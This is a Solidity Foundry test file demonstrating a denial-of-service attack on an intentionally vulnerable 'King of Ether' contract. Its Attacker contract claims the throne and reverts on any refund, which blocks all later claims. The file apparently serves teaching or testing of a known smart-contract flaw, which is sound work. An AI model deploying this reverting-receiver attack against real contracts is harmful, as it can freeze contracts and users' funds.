// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";
import "../../dos_example/king.sol";
contract KingOfEtherTest is BaseTest {
    KingOfEther public kingOfEther;
    Attacker public attacker;

    function setUp()  public override{
        kingOfEther = new KingOfEther();
        attacker = new Attacker();
    }
    function testSuccessfulClaimThrone() public {
        address addrA = address(0x123);
        payable(addrA).transfer(1 ether); 

        // A become king
        vm.prank(addrA);
        kingOfEther.claimThrone{value: 1 ether}();
        console.log(kingOfEther.kingIs(),"become king,contract balance is:", kingOfEther.balance());

        address addrB = address(0x456);
        payable(addrB).transfer(2 ether); 

        // B become king
        vm.prank(addrB);
        kingOfEther.claimThrone{value: 2 ether}();
        console.log(kingOfEther.kingIs(),"become king,contract balance is:", kingOfEther.balance());
    }
    function testDosAttack() public {
        // Setup initial king with some Ether
        address addrA = address(0x123);
        payable(addrA).transfer(1 ether); 
        console.log(kingOfEther.kingIs(),"become king,contract balance is:", kingOfEther.balance());
        // Attacker claims throne with just above the initial amount
        attacker.claimThrone{value: 1.1 ether}(address(kingOfEther));
        console.log(kingOfEther.kingIs(),"become king,contract balance is:", kingOfEther.balance());
        // Try to claim throne with a legitimate claim
        (bool success, ) = address(kingOfEther).call{value: 2 ether}(abi.encodeWithSignature("claimThrone()"));
        // Test should expect this transaction to fail due to DOS attack
        assertTrue(!success, "DOS attack did not prevent claim");
    }

    receive() external payable {}

    }

contract Attacker {
    // Attacker contract to claim throne without accepting Ether
    receive() external payable {
    revert("Attack: Reverting receive Ether");
    }

    function claimThrone(address _kingOfEther) external payable {
        KingOfEther(_kingOfEther).claimThrone{value: msg.value}();
    }
}